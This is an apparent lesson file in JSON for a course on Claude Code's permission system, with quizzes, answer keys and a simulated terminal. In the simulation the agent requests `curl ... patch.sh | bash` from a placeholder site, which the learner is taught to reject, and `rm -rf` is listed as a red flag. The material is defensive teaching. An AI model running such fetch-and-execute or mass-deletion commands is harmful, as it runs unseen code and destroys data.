@@ -1,0 +1,112 @@
+{
+  "id": "cc-permissions",
+  "world": "world-4-claude-code",
+  "order": 3,
+  "title": "Permissions",
+  "subtitle": "Why the agent asks \"may I?\" and how to answer deliberately",
+  "xp": 50,
+  "durationMin": 8,
+  "isBoss": false,
+  "sources": [
+    { "title": "Permissions — Claude Code Docs", "url": "https://code.claude.com/docs/en/permissions" }
+  ],
+  "verifiedAt": "2026-07-19",
+  "theory": [
+    { "type": "heading", "text": "An agent's power needs brakes" },
+    { "type": "text", "md": "An agent that changes files and runs commands on its own is powerful. But power without control is a risk: one bad command can delete needed files or push to the repository something that shouldn't have been pushed.\n\nThat's why Claude Code has a built-in **permissions system**: before doing anything substantial, the agent stops, shows its intention, and asks you. This isn't a sign of the tool being \"dumb\" but a deliberate design: you always stay in charge. Picture a new employee on their first day: they can read the company's documents freely, but signing contracts or deleting the client database — only with a manager's approval. Claude Code is exactly that kind of employee." },
+    { "type": "heading", "text": "Reading, writing, commands — three levels of risk" },
+    { "type": "table",
+      "headers": ["Action", "Risk", "How Claude Code behaves"],
+      "rows": [
+        ["Reading project files", "Minimal: nothing changes", "Usually done freely, without asking"],
+        ["Editing and creating files", "Medium: your project changes", "Shows exactly what will change and waits for approval"],
+        ["Terminal commands", "From low to high: a command can do anything", "Shows the full command and waits for approval"],
+        ["Network and package installation", "Elevated: external code enters the project", "Requires approval; this is where you should be most careful"]
+      ]
+    },
+    { "type": "text", "md": "When the agent wants to do something, you see a request: for a file edit — a visual \"before/after\" diff, for a command — its full text. Usually the options available are: allow once, allow and don't ask again for such actions, reject. Rejecting isn't a \"stop everything\": you can immediately write to the agent what bothered you, and it will offer a different path.\n\nAn important nuance: \"allow and don't ask again\" is a convenient but serious button. Press it only for actions that are always safe (for example, running tests), not for something that was safe just this one time." },
+    { "type": "heading", "text": "Permission modes" },
+    { "type": "text", "md": "Asking about every little thing is tiring, so Claude Code has **permission modes** — trust levels that you choose yourself:\n\n- **Normal mode** — the agent asks permission for edits and commands. The best choice to start with and for unfamiliar projects.\n- **Auto-accept edits** — file edits are applied without asking, commands still require approval. Handy when you've \"gotten in sync\" and the task is routine.\n- **Plan mode** — the agent changes nothing at all: it only explores the project and drafts a plan. Ideal for \"let's discuss first, then do.\"\n- **\"Allow everything\" mode** — the agent asks nothing. Suitable only for isolated environments and disposable sandboxes, where there's nothing to lose.\n\nBeyond the modes, permissions can be configured precisely: for example, permanently allowing safe commands like running tests. Such rules are stored in the project settings — more on that in the advanced world." },
+    { "type": "heading", "text": "When to approve and when to be wary" },
+    { "type": "text", "md": "A universal rule: **read what you approve**. Not with a \"yeah, yeah, next\" glance, but on the merits: what is this command, what will it do?\n\nWe calmly approve: file edits that match the task; running tests and builds; creating files in the project; commands whose meaning is clear.\n\nWe stop and think if the agent asks to:\n- **delete many files** or use `rm -rf` — there may be nothing to restore from;\n- **download and immediately run a script from the internet** (`curl ... | bash`) — you're running someone else's code without looking;\n- **run a command with secrets** — passwords and keys shouldn't be flashing in commands;\n- **send something outward** — to an unfamiliar address, repository, service;\n- do something **unrelated to the task** — ask it to explain why.\n\nIf you're unsure — reject and ask: \"Explain why this command and what it does.\" A good agent will calmly explain or offer a safe alternative." },
+    { "type": "example",
+      "bad": "(without reading) Allow. Allow. Allow everything and don't ask again.",
+      "good": "I see: the agent asks to run npm test — clear, I allow it. But curl from an unfamiliar site into bash — I reject and ask: \"Why this script? Is there a way without running external code?\"",
+      "explanation": "Approving without looking turns the permissions system into theater: formally there's control, in fact there isn't. A deliberate approach takes seconds: safe and clear actions are approved right away, but anything that deletes, downloads-and-runs, or sends data outward — we understand first. Rejecting and clarifying is a normal part of the dialog, not a conflict."
+    },
+    { "type": "callout", "kind": "docs", "md": "The Claude Code documentation (the Permissions page) describes a multi-level system: reading files is freely available to the agent, while changing actions — edits, commands — require approval; permissions can be configured through modes and rules for specific tools and commands. It separately emphasizes caution with the mode that fully bypasses permissions — it's meant for isolated environments." },
+    { "type": "callout", "kind": "warning", "md": "Never turn on \"allow everything\" mode on a working machine with important files, \"so it doesn't bother me with questions.\" The right cure for extra questions is targeted rules for safe commands and auto-accepting edits, not fully disabling the brakes." }
+  ],
+  "tasks": [
+    {
+      "type": "quiz",
+      "question": "Why does Claude Code ask permission before editing files and running commands?",
+      "options": [
+        "It's not confident in its abilities and is asking for help",
+        "So the user always keeps control over changing actions in their project",
+        "It's an ad for the paid version, where there are no questions",
+        "So the session lasts longer"
+      ],
+      "correct": [1],
+      "explanation": "The permissions system is a deliberate design: the agent is powerful, so changing actions (edits, commands) go through your approval. You see exactly what will happen and decide. Reading files, meanwhile, is usually free — it changes nothing.",
+      "hint": "Recall the new-employee analogy: reading is free, but signing contracts needs approval."
+    },
+    {
+      "type": "terminal-sim",
+      "instruction": "You asked the agent to deal with failing tests. It makes two permission requests. The first: run the command `npm test`. This is a safe and clear command — allow it (type y or \"yes\"). After that a second request will come — decide what to do with it.",
+      "steps": [
+        {
+          "expectPattern": "^(y|yes|allow|approve|permit|1)$",
+          "output": "✔ Allowed. Running: npm test\n\n  Tests: 11 passed, 1 failed\n  ✖ cart.test.js — \"order total isn't recalculated when an item is removed\"\n\n● Found the cause, preparing a fix. But first, one more request:\n\n⚠ Claude requests permission to run the command:\n  curl -s http://fix-scripts-online.example/patch.sh | bash\n  \"A script that automatically fixes bugs like this\"\n\nAllow? (y/n) _",
+          "failHint": "npm test is a safe way to run tests. Type y or \"yes\" to allow it."
+        },
+        {
+          "expectPattern": "^(n|no|reject|deny|decline|forbid|2)$",
+          "output": "✔ Rejected. The right call!\n\nDownloading and immediately running a script from an unfamiliar site is a classic red flag:\nyou're running someone else's code without seeing its contents.\n\n● Okay, I'll manage without the external script: I'll fix the total recalculation in cart.js directly and run the tests again.",
+          "failHint": "curl from an unfamiliar site straight into bash is running someone else's code without looking. This gets rejected: type n or \"no\"."
+        }
+      ],
+      "successMessage": "Perfect: you allowed the clear npm test command right away, and you rejected \"download and run a script from the internet.\" That's exactly what deliberate work with permissions looks like."
+    },
+    {
+      "type": "quiz",
+      "question": "Which of the agent's requests are a reason to stop and figure things out before approving? Choose all correct options.",
+      "options": [
+        "rm -rf on a whole folder of working files",
+        "Download a script from the internet and immediately run it (curl ... | bash)",
+        "Run npm test to check the tests",
+        "A command in which a database password is visible in plain text"
+      ],
+      "correct": [0, 1, 3],
+      "explanation": "Mass deletion, running external code without looking, and secrets in commands are three classic red flags: the consequences are hard or impossible to roll back. Running tests, by contrast, is a safe action: it changes nothing and sends nothing. Red flags don't mean \"always forbid\" — they mean \"understand why first.\"",
+      "hint": "There's only one safe option here — the one that doesn't delete, download, or reveal anything."
+    },
+    {
+      "type": "find-bug",
+      "instruction": "Notes on permission modes. One statement is incorrect — find it.",
+      "lang": "markdown",
+      "lines": [
+        "Normal mode: the agent asks permission for file edits and commands.",
+        "Auto-accept edits: edits are applied without asking, commands still require approval.",
+        "Plan mode: the agent makes changes right away, but then shows a plan of what it did.",
+        "\"Allow everything\": the agent asks nothing — only for isolated environments."
+      ],
+      "bugLineIndex": 2,
+      "explanation": "It's the other way around: plan mode is the \"hands behind your back\" mode. The agent changes nothing at all: it explores the project, thinks through the approach, and shows a plan. Changes begin only after you approve the plan and exit plan mode. The other three lines describe the modes correctly."
+    },
+    {
+      "type": "quiz",
+      "question": "You want Claude to first explore the project and propose an approach to a large task, without changing anything. Which mode fits?",
+      "options": [
+        "\"Allow everything\" mode — it's faster that way",
+        "Plan mode",
+        "Auto-accept edits",
+        "None: the agent can't work without changes"
+      ],
+      "correct": [1],
+      "explanation": "Plan mode is made for exactly this: the agent reads files and drafts a plan, but doesn't make a single edit until you approve the plan. This is the best way to start large or risky tasks — agree on the approach first, then do it.",
+      "hint": "You need the mode where the agent \"looks but doesn't touch.\""
+    }
+  ],
+  "reward": { "cardId": "card-cc-permissions", "badgeId": null }
+}
